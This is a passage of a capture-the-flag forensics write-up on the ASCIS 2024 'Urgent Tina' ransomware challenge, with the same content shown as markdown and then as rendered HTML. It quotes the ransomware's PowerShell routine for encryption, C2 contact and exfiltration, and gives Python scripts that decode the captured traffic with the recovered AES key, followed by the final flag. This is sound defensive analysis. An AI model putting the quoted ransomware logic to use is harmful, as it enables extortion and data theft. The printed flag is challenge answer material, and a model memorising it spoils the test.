[!]\r\n C:\\Users\\IEUser\\Documents\\vietnam.jpg is now encrypted [!]\r\n C:\\Users\\IEUser\\Documents\\z3399223868975_f9672eaf281fbf6771659ccb18692a12.jpg is now encrypted\r\n ```\r\n\r\nBingo, many `.txt` file was encrypted. \r\n### Finding the flag\r\nNow we need to find how and where the file was sent.\r\n\r\nLooking back at main function, we could see after running `EncryptFiles` it run `ExfiltrateFiles` \r\n\r\n```powershell\r\nif ($Mode -eq \"-d\") { \r\n Write-Host ; Write-Host \"[!] Shutdowning....\" -ForegroundColor Red; sleep 1 }\r\nelse {\r\n Write-Host ;\r\n Write-Host \"[+] Checking communication with C2 Server..\" -ForegroundColor Blue\r\n $DCe = GetStatus ; sleep 1\r\n $WiETm = -join ( (48..57) + (65..90) + (97..122) | Get-Random -Count 24 | % {[char]$_})\r\n Write-Host \"[!] Encrypting ...\" -ForegroundColor Red\r\n CreateReadme ; EncryptFiles ; if ($DCe) { SendResults ; sleep 1\r\n if ($ENyR -eq \"-x\") { Write-Host \"[i] Exfiltrating ...\" -ForegroundColor Green\r\nExfiltrateFiles ; sleep 1 }}\r\n if (!$DCe) { Write-Host \"[+] Saving logs in yaginote.txt..\" -ForegroundColor Blue }\r\n else { Write-Host \"[+] Sending logs to C2 Server..\" -ForegroundColor Blue }}\r\n if ($args -like \"-demo\") { RemoveWallpaper ; PopUpRansom\r\n if ($PayNow -eq \"True\") { SendPay ; SendOK } else { SendClose ; SendOK }}\r\n else { SendOK }\r\nsleep 1000 ; Write-Host \"[i] Done!\" -ForegroundColor Green ; Write-Host\r\n```\r\nThe `EncryptFiles` and `ExfiltrateFiles` processes, in short, encrypt all files in a folder (file exclusions are defined within the functions) using AES encryption with the key `$masterEncryptionKey` and then encrypt the data again using `R64Encoder`\r\n\r\n\r\nLooking at the HTTP stream we could see the process too. \r\n\r\n![alt text](\u003C../../../assets/images/urgent-tina/2025-04-08_01-47.png)\r\n\r\nAfter decoding the file names, we can determine where to start: at `/files/j5WZuQHe05-Mx81ZhxmZ` since it's `flag_1.txt`.\r\n\r\nWith a little help from good old ChatGPT :> I could use this script to extract the `file's name : data` to `output.txt`\r\n\r\n```python\r\nimport pyshark\r\n\r\ncap = pyshark.FileCapture('traffic.pcapng', display_filter='http.request.method == POST')\r\n\r\npost_data = []\r\n\r\nfor packet in cap:\r\n    if hasattr(packet, 'http'):\r\n        url = packet.http.request_uri.split('/')[-1] \r\n        payload = packet.http.file_data if 'file_data' in packet.http.field_names else \"\"\r\n        post_data.append(f\"{url} : {payload}\")\r\n\r\nwith open(\"output.txt\", \"w\") as f:\r\n    for entry in post_data:\r\n        f.write(f\"{entry}\\n\")\r\n```\r\n\r\nBut why not decrypt it on the go, let fix the script\r\n\r\n```python\r\nimport base64\r\nimport binascii\r\nimport re\r\nimport pyshark\r\n\r\ndef reverse_decode(strings):\r\n    reversed_strings = strings[::-1]\r\n    replaced_strings = reversed_strings.replace(\"-\", \"C\").replace(\"_\", \"E\")\r\n    padding = len(replaced_strings) % 4\r\n    if padding:\r\n        replaced_strings += \"=\" * (4 - padding)\r\n    try:\r\n        decoded = base64.b64decode(replaced_strings)\r\n        return decoded.decode('utf-8', errors='replace')\r\n    except Exception as e:\r\n        print(f\"Error decoding URL: {e}\")\r\n        return \"\"\r\n\r\ncap = pyshark.FileCapture('traffic.pcapng', display_filter='http.request.method == POST')\r\npost_data = []\r\n\r\nfor packet in cap:\r\n    if hasattr(packet, 'http'):\r\n        url_part = packet.http.request_uri.split('/')[-1]\r\n        decoded_url = reverse_decode(url_part)\r\n        hex_payload = packet.http.file_data if 'file_data' in packet.http.field_names else \"\"\r\n        ascii_payload = \"\"\r\n        \r\n        if hex_payload:\r\n            try:\r\n                cleaned_hex = hex_payload.replace(\":\", \"\")\r\n                ascii_payload = binascii.unhexlify(cleaned_hex).decode('ascii')\r\n            except Exception as e:\r\n                ascii_payload = hex_payload\r\n        \r\n        if \"flag\" in decoded_url:\r\n            post_data.append(f\"{decoded_url} : {ascii_payload}\")\r\n\r\ndef natural_sort_key(s):\r\n    url_part = s.split(\" : \")[0]\r\n    numbers = re.findall(r'\\d+', url_part)\r\n    if numbers:\r\n        number_idx = url_part.find(numbers[0])\r\n        prefix = url_part[:number_idx]\r\n        number = int(numbers[0])\r\n        suffix = url_part[number_idx + len(numbers[0]):]\r\n        return (prefix, number, suffix)\r\n    return (url_part, 0, '')\r\n\r\npost_data.sort(key=natural_sort_key)\r\n\r\n\r\noutput_file = \"decoded_output.txt\"\r\nwith open(output_file, \"w\", encoding=\"utf-8\") as f:\r\n    for data in post_data:\r\n        data = data.strip().split(\" : \", 1)[1].strip() \r\n        f.write(data + \"\\n\")\r\n\r\n```\r\nThis script decodes all URLs and payloads from HTTP POST requests in the `.pcapng` file. It specifically extracts and decodes data related to flag files, then sorts them by number and saves the results to `output.txt`. Thanks ChatGPT\r\n```\r\n0NaXoN6fZexANHcU0Q+PtJtipYzI1MWcVGsKGQGi4v/\r\nIz8pc9b88c1mOQHmc1hH5+xRDVFsPzL___qz1F-L724\r\nIAjJSPH1fgXSn659HaDJu9Tdob60WIocHOc1Kfa-IkY\r\novz+j4Q1GiLLxdVqoPWohve60Nr/3Lwqba0yYxPkQ/0\r\nsWpGT6d6xXQxdV2ZASbUUiMOgeKUyGJkzMHwsQNM-7T\r\n0h7yIaG-lmzfeSHpF/caBFusl8KRGnPLuYvWw4_o-zL\r\nIZlAZWhTVPnUB3yr9D11+JGlTNmIAYkg16bXjc_BWzs\r\nMzmqd+n3r0Vz/TpoaWHGLDcKndIzd9r-Oqw1t4TFcw7\r\nkUfLVO1h2r1R7c_a0A8lTDh1Q+g6KovyM5RtRVPd/Og\r\nAP6WHYj/iIeVJpLYXKZDjVLsWxyKbp1UGbApg8FeIzy\r\nsdbNtnSpme/IKsR8lnccrkrUQ8LnmG9Hre+ZPu9pzfI\r\nIPQButt+ZPszbfnFuxcwm8k7xsIW9UGyHa9ni/IHu0O\r\nUAOq1KVjPH2Wgewl8tyRwIhXLM-adWVTh0AjnTGUk-i\r\noX9rxi+jGLsyYqFZ6HXnZZw/QJod5Z+_QT9kPr_SjSf\r\n49gqimKu1B11q9h5bOOxybdxiSqwdN6YdOrPHGHf_e+\r\nMSsr5rHr6DGetJzYdi+-94kFFbBk+briOAm7s2OXpdu\r\nAt+eeUxAhPUl8K87Dihj1ca_z-aK7wtWm_kP0y4xewt\r\nISOWbQnQ9zmXmjRSpd6b1YGSdIH7/FX4q2dZSvgaUtv\r\nM7PI81by1P7N_O3cXaaVQZPf/-/+-TKNSYuuxWLrM++\r\noxyTKzWBhT3k6_DXdk8w/vdQqoNADs33+1uofd1ag85\r\n8ZM5IvDhvUe3oyorBcLNVGn8jHkeV1ugcw7YLkkrsOh\r\nIUABjgWWScWKL61QX6SL1ZInpgTraKhUlsnRwftK51w\r\nAjqTGzWp1NU_c3osnj5UiMqoSjyr+cWS1zRkPraXZia\r\ncVjuho2jDb52OThxF-x-hU4g/_f3UfcbnOjW4rV8/8B\r\nYY5ual0Zjw2LQRl3cMkqbXVRD/ccj8N1nKypZY+chbh\r\n_uDVjd009Xph0iNy5jFbZu-G+r9_VTWtd8bn/WmhHa1\r\noq45d7S6pe_Ow7WPz95_/ceoLpl7eTyTl-B+ukcaDzZ\r\nwfK8MdOj8TVV7URziByBOKeaAF6q-gSJisvJqur2bhc\r\nsAciFmeJz9eN-Tp9VXb4TVar_9Gb/72uGa/RVrh_IQu\r\n8Gd2ZYvnhuZS9sPs3zZ_QRAIPIixf9un046KTDzfA+L\r\nsZVwZ1WkJOb4o9uhLjAx58cMZ5VNggXTrDaywWuNwx2\r\nI4PPy59X8GiVHnU_a_saMvGWbqPMOiHpRwtY5kadUPF\r\n8cnQt_79-/l4G5I3UQs0eRUyoGB6rdSXlJe-ZLqiaj+\r\nMNojovs4bjD+_O0ReYV8B3tXWet/gGO9Vmv/h9TRI1M\r\n_6Apj84DodnhHXzs23taUK1Q5Xg4fNyhmsu00eKk0T3\r\nQm0g/vv0pGZKaOXOkNL73o4/-lMW3xVwFRDh9px8WRU\r\nMXzDZsAazbswbZQrBO8dGk_8+Ox-85rwOi_akbXkytd\r\nY95QY2ADl-Ma1JhiOO0xAW-iXXifoydMji4MIXdD6_q\r\n4WKyk6O_+-I5m_HIlmz_sWs5TS6rivrirGt/SmQreXh\r\nA/51-ZUiV5Rr-XXFWWmQVunUYp2FI26GWa5goTBnufo\r\n0-mzzX-WGHYXJ1Jzu1ZViOR/Z6coGsGIG+1RscRuy2j\r\n0LrHb8yls--qBcHxx6In3-nT7-0zDJYHtRZ8yQbYms4\r\nIuuPZrbgKeL+k6lHIBep7njjinpKa_Of-yuDoGAb8f0\r\nkXt8cBp/yuR+/000Y3McIOXuMV4/F73ODpsYFtBi96i\r\nYjluSk8L5xvmivpWb-LR2YHt_8dSh8M3TB7ps-UIh6Q\r\nYZH5Zwm57hf3GZcSDZgwg-wthUzJpGImB1wRH97B2h1\r\ngD4JPXlJJ0NqSiG57+p/opBLBPj1wk51SV8NNQozPha\r\nsnlwDu_2oZ1nJvV4SUzrjjNwnX_p0USQDFSAP7HviKZ\r\n454DgPfVhcb3pJpjLjxfAxtUHhngRGrvTYrzwM8m_1Y\r\n_k+mQ1N+HjeVRVVmHHy0IBs0bHsRbI_MLLJLKcjjZs4\r\n0sgM4yYBHYckscKzzgnkIQGVjXvS-5TeQ31YixBK1S1\r\n0D10/t/sx2ubSLesvfBpBHQ3IzANTKt36Gpza4gL175\r\nIvBGSaSNtyMb-dZMaKkbGAmuhMHMnTtctxgRjRORKy8\r\ncFDmohU81k2dQZRTh-WAhqU5KTfw2my0OdTI7v8sw2l\r\nU2Ny2Z2l8O6ydHHRc55wfksWP6K7wc0fagggW92zPYO\r\n4S4/i/2trkTDuaiZu6mMHDcxo+T/ixX08oSLRtqo/an\r\nI-Nygh527T+JZxrf3D1cciQtpttih6S59QB9w1_t02e\r\nIKu3_m5xI0ASe6efLJDOyHeKRf6NjnVVIi0/9FeOBeI\r\ngFcuLzU5jQwJBmAoUqDyTMO/7FO24dRLGbF4TsLgmKw\r\n```\r\nNow we just need to decode this data to get our flag.\r\n\r\n```python \r\nimport base64\r\nfrom Crypto.Cipher import AES\r\nfrom Crypto.Hash import SHA256\r\n\r\ndef reverse_decode(encoded_data):\r\n    reversed_data = encoded_data[::-1]\r\n    replaced_data = reversed_data.replace('-', 'C').replace('_', 'E')\r\n    \r\n    padding = 4 - (len(replaced_data) % 4)\r\n    if padding \u003C 4:\r\n        replaced_data += '=' * padding\r\n\r\n    return replaced_data \r\n\r\ndef aes_decrypt(encrypted_text, key):\r\n    key_hash = SHA256.new(key.encode('utf-8')).digest()\r\n\r\n    encrypted_bytes = base64.b64decode(encrypted_text)\r\n    \r\n    iv = encrypted_bytes[:16]\r\n    cipher_text = encrypted_bytes[16:]\r\n    \r\n    cipher = AES.new(key_hash, AES.MODE_CBC, iv)\r\n    \r\n    decrypted_bytes = cipher.decrypt(cipher_text)\r\n    \r\n    pad_len = decrypted_bytes[-1]\r\n    decrypted_bytes = decrypted_bytes[:-pad_len]\r\n\r\n    return decrypted_bytes.decode('utf-8')\r\n\r\nwith open('./decoded_output.txt', 'r') as file:\r\n    lines = file.readlines()\r\n\r\ndecoded_output = ''\r\nfor line in lines:\r\n    line = line.strip()\r\n    if line: \r\n        replaced_line = reverse_decode(line)\r\n        plain = aes_decrypt(replaced_line,\"YaMfem0zr4jdiZsDUxv1TH69\")\r\n        decoded_output += plain\r\n\r\nprint(decoded_output)\r\n```\r\n```powershell\r\npython .\\FinalDecryptttt.py\r\nASCIS{N0th1n9_1$_m0r3_pr3c10u5_7h4n_1ndEp3ndenc3_&_fr33d0m}\r\n```\r\n## Note\r\n\r\nWhen analyzing the memdump, I used the 'strings' command to capture the PowerShell script as well as to check the processes running within the memory dump. But there are better ways to do this.\r\n\r\nWe could load the memdump into Visual Studio to check the memdump modules:\r\n\r\n![alt text](\u003C../../../assets/images/urgent-tina/2025-04-08_22-13.png)\r\n_update.DMP in Visual Studio_\r\n\r\nWe could see the process name as well as the modules that were loaded. After some searching, we could determine that the program was executing a PowerShell script.\r\n\r\n![alt text](\u003C../../../assets/images/urgent-tina/2025-04-09_00-45.png)\r\n_PowerShell related modules_\r\n\r\nRunning diagnostic analysis, we could confirm that the program used PowerShell:\r\n\r\n![alt text](\u003C../../../assets/images/urgent-tina/2025-04-09_01-42.png)\r\n_Diagnostic analysis_\r\n\r\nWe won't find the `update.ps1` here; that's where we return to the `strings` method.\r\n\r\nAnother way was using `DetectItEasy` to analyze the memdump, with the following results.\r\n\r\n![alt text](\u003C../../../assets/images/urgent-tina/2025-04-09_15-36.png)\r\n_DiE results_\r\n\r\nAs we can see, this was a Windows Minidump containing PowerShell script code, which is why we needed to use the `strings` method to extract the script.\r\n\r\n> Till this point I know that the memdump wasn't corrupted but rather a minidump.\r\n\r\n## Thoughts on the challenge\r\n\r\nThis was a pretty fun challenge. Finding the PowerShell script was particularly challenging from the get-go since we didn't know what we were looking for.\r\n\r\nBased on the `MITRE ATT&CK Framework`, the following techniques were used in this malware:\r\n\r\n- `T1059.001`: Command and Scripting Interpreter: PowerShell\r\n- `T1486`: Data Encrypted for Impact\r\n- `T1041`: Exfiltration Over C2 Channel\r\n- `T1564.001`: Hide Artifacts: Hidden Files and Directories\r\n- `T1027`: Obfuscated Files or Information\r\n\r\nThe malware avoids encrypting OS files, uses AES with randomized keys for the encryption process. Exfiltration is HTTP-based with a combination of base64, AES, and ZIP encoding.\r\n\r\n> Thanks to the `.pcapng` file, we were able to solve this challenge. This highlights the importance of enabling DNS, HTTP, and command-line logging (through tools like Sysmon, Windows Defender ATP, etc.).\r\n{: .prompt-tip}\r\n\r\nThat's all for this challenge :33 Peaceeeeee","src/content/blog/ascis-2024-urgent-tina-writeup/index.md",[51,52],"../../../assets/images/urgent-tina/Files Given.png","./banner.jpg","7a7452382bfc6c5c",{"html":55,"metadata":56},"\u003Csection class=\"heading\" data-heading-rank=\"2\" aria-labelledby=\"challenge-description\">\u003Ch2 id=\"challenge-description\">Challenge Description:\u003C/h2>\n\u003Cp>Our client is a pessimist, she is worried that if she does not pay the ransom in the next 8 hours, the hacker will not give her any more chance to get her data back. We are trying to reassure her because we believe that our talented experts can find the cause and restore her data in less than 8 hours.\u003C/p>\n\u003Cp>Author: bquanman\u003C/p>\n\u003Cp>\u003Ccode>ASCIS{N0th1n9_1$_m0r3_pr3c10u5_7h4n_1ndEp3ndenc3_&#x26;_fr33d0m}\u003C/code>\u003C/p>\n\u003C/section>\u003Csection class=\"heading\" data-heading-rank=\"2\" aria-labelledby=\"thought-process\">\u003Ch2 id=\"thought-process\">Thought process\u003C/h2>\n\u003Csection class=\"heading\" data-heading-rank=\"3\" aria-labelledby=\"file-inspection\">\u003Ch3 id=\"file-inspection\">File inspection\u003C/h3>\n\u003Cp>We are given a \u003Ccode>.pcapng\u003C/code> and a \u003Ccode>.DMP\u003C/code> file.\u003C/p>\n\u003Cp>\u003Cimg __ASTRO_IMAGE_=\"{&#x22;src&#x22;:&#x22;../../../assets/images/urgent-tina/Files Given.png&#x22;,&#x22;alt&#x22;:&#x22;Files Given&#x22;,&#x22;index&#x22;:0}\">\r\n\u003Cem>Files given\u003C/em>\u003C/p>\n\u003Csection class=\"heading\" data-heading-rank=\"4\" aria-labelledby=\"pcapng-file-inspection\">\u003Ch4 id=\"pcapng-file-inspection\">\u003Ccode>.pcapng\u003C/code> file inspection\u003C/h4>\n\u003Cp>Opening the \u003Ccode>.pcapng\u003C/code> file.\u003C/p>\n\u003Cp>![Opened .pcapng file](&#x3C;../../../assets/images/urgent-tina/2025-04-05_00-25.png)\r\n\u003Cem>Opened file\u003C/em>\u003C/p>\n\u003Cp>Let’s follow the TCP stream to check what was going on.\u003C/p>\n\u003Cp>![TCP stream](&#x3C;../../../assets/images/urgent-tina/2025-04-05_00-28.png)\r\n\u003Cem>TCP stream\u003C/em>\u003C/p>\n\u003Cp>It seems to be encoded. We were given not only the \u003Ccode>.pcapng\u003C/code> file but also a \u003Ccode>.DMP\u003C/code> - a memory dump - maybe the encoding algorithm was in the memory dump. So let’s leave the \u003Ccode>.pcapng\u003C/code> there for now and inspect the memory dump.\u003C/p>\n\u003C/section>\u003Csection class=\"heading\" data-heading-rank=\"4\" aria-labelledby=\"memdump-inspection\">\u003Ch4 id=\"memdump-inspection\">memdump inspection\u003C/h4>\n\u003Cp>A memory dump suggests we use \u003Ccode>Volatility\u003C/code>, so let’s try it out.\u003C/p>\n\u003Cfigure data-rehype-pretty-code-figure=\"\">\u003Cpre style=\"--shiki-light:#0e1116;--shiki-dark:#f0f3f6;--shiki-light-bg:#ffffff;--shiki-dark-bg:#0a0c10\" tabindex=\"0\" data-language=\"bash\" data-theme=\"github-light-high-contrast github-dark-high-contrast\">\u003Ccode data-language=\"bash\" data-theme=\"github-light-high-contrast github-dark-high-contrast\" style=\"display: grid;\">\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#702C00;--shiki-dark:#FFB757\">┌──(d4nhwu4n㉿hide-and-seek\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">)-[/mnt/e/CTF/UrgentTina SVATTT]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#702C00;--shiki-dark:#FFB757\">└─$\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> vol\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> -f\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> update.DMP\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> windows.filescan\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#702C00;--shiki-dark:#FFB757\">Volatility\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> 3\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> Framework\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> 2.11.0\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#702C00;--shiki-dark:#FFB757\">Progress:\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">  100.00\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">               PDB\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> scanning\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> finished\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#702C00;--shiki-dark:#FFB757\">Unsatisfied\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> requirement\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> plugins.FileScan.kernel.layer_name:\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#702C00;--shiki-dark:#FFB757\">Unsatisfied\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> requirement\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> plugins.FileScan.kernel.symbol_table_name:\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\"> \u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#702C00;--shiki-dark:#FFB757\">A\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> translation\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> layer\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> requirement\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> was\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> not\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> fulfilled.\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">  Please\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> verify\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> that:\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#702C00;--shiki-dark:#FFB757\">        A\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> file\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> was\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> provided\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> to\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> create\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> this\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> layer\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> (by \u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">-f,\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> --single-location\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> or\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> by\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> config\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">)\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#702C00;--shiki-dark:#FFB757\">        The\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> file\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> exists\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> and\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> is\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> readable\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#702C00;--shiki-dark:#FFB757\">        The\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> file\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> is\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> a\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> valid\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> memory\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> image\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> and\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> was\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> acquired\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> cleanly\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\"> \u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#702C00;--shiki-dark:#FFB757\">A\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> symbol\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> table\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> requirement\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> was\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> not\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> fulfilled.\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">  Please\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> verify\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> that:\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#702C00;--shiki-dark:#FFB757\">        The\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> associated\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> translation\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> layer\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> requirement\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> was\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> fulfilled\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#702C00;--shiki-dark:#FFB757\">        You\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> have\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> the\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> correct\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> symbol\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> file\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> for\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> the\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> requirement\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#702C00;--shiki-dark:#FFB757\">        The\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> symbol\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> file\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> is\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> under\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> the\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> correct\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> directory\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> or\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> zip\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> file\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#702C00;--shiki-dark:#FFB757\">        The\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> symbol\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> file\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> is\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> named\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> appropriately\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> or\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> contains\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> the\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> correct\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> banner\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\"> \u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#702C00;--shiki-dark:#FFB757\">Unable\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> to\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> validate\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> the\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> plugin\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> requirements:\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> [\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">'plugins.FileScan.kernel.layer_name'\u003C/span>\u003Cspan 